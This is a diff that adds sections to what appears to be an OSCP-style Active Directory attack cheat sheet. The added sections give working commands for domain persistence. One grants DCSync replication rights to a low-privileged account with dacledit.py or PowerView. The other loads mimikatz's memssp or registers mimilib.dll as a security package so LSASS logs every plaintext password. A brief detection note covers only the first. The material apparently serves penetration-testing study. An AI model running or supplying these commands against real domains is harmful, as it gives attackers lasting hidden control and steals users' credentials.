@@ -162,6 +162,32 @@ Afterward, authenticate as any domain user using the master password "mimikatz" 
 
 ---
 
+### DCSync Backdoor Persistence (granting replication rights)
+**Explanation:** With DA access, grant `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` ACEs to a low-privileged user — this user can then DCSync at will even after the DA account password is rotated, providing persistent domain-level access.
+```bash
+# Impacket dacledit (preferred for OSCP — Linux-native)
+dacledit.py -action write -rights DCSync -principal lowprivuser -target-dn 'DC=domain,DC=local' domain.local/admin:pass -dc-ip <DC_IP>
+
+# PowerView alternative (from a DA PowerShell session)
+Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity lowprivuser -Rights DCSync
+```
+**Detection/cleanup:** audit `nTSecurityDescriptor` on the domain root for unexpected replication ACEs; `Remove-DomainObjectAcl` or `dacledit.py -action remove` to clean up.
+
+### Custom SSP Persistence (mimilib.dll)
+**Explanation:** Loading a custom Security Support Provider (SSP) DLL into LSASS causes it to log all future authentication events (including plaintext passwords) to a file. This survives password rotations but NOT reboots unless the DLL is also registered in the registry.
+```cmd
+:: In-memory (does not survive reboot)
+mimikatz # misc::memssp
+:: Credentials logged to C:\Windows\System32\mimilsa.log
+
+:: Persistent (survives reboot — register in registry)
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /f
+:: Copy mimilib.dll to C:\Windows\System32\
+:: After next reboot, all authentications are logged to C:\Windows\System32\mimilsa.log
+```
+
+---
+
 ## Summary Table
 
 | Technique | Primary Port(s) | Artifact Created | Stealth vs. PsExec |
